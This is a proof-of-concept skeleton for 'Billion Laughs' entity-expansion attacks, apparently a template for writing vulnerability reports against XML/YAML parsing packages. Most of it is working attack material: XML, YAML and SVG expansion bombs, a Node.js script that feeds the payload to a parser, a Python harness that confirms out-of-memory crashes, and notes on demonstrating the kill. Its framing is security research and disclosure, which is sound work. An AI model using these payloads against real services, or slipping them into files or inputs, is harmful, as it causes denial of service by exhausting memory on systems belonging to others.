# PoC Skeleton — Entity Expansion (Billion Laughs)

## XML Billion Laughs Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

**Expansion math**: 10^9 copies of "lol" = ~3GB of text from ~800 bytes of XML.

## JavaScript PoC

```js
/**
 * CVE-CANDIDATE: Billion Laughs in [package-name] [version]
 * CWE: CWE-776 (Improper Restriction of Recursive Entity References)
 * CVSS: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 */
const { XMLParser } = require('[package-name]');

const payload = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>`;

console.log('[*] Payload size:', payload.length, 'bytes');
console.log('[*] Expected expansion: ~3GB');
console.log('[*] Parsing...');

const before = process.memoryUsage().heapUsed;
const parser = new XMLParser();

try {
  parser.parse(payload);
} catch (e) {
  console.log('[!] Error:', e.message);
}

const after = process.memoryUsage().heapUsed;
console.log(`[+] Memory used: ${((after - before) / 1024 / 1024).toFixed(2)} MB`);
console.log('[+] Process likely OOM killed before reaching this line');
```

## YAML Alias Bomb Payload

```yaml
# YAML Billion Laughs via alias expansion
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## SVG Entity Expansion

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&lol4;</text>
</svg>
```

## Memory Measurement Script

```python
#!/usr/bin/env python3
"""Measure memory growth from entity expansion."""
import subprocess, sys, time

# Run PoC in subprocess with timeout
proc = subprocess.Popen(
    ['node', 'poc.js'],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

try:
    stdout, stderr = proc.communicate(timeout=10)
    print('[*] Output:', stdout.decode())
except subprocess.TimeoutExpired:
    proc.kill()
    print('[+] CONFIRMED: Process hung/OOM — entity expansion successful')
```

## Reporting Notes

- Always specify the payload size vs expanded size ratio
- Measure with a SMALLER payload first (lol4 or lol5) to show growth without OOM
- Then demonstrate that lol9 kills the process
- Note whether OOM is uncatchable (process.on('uncaughtException') won't help)
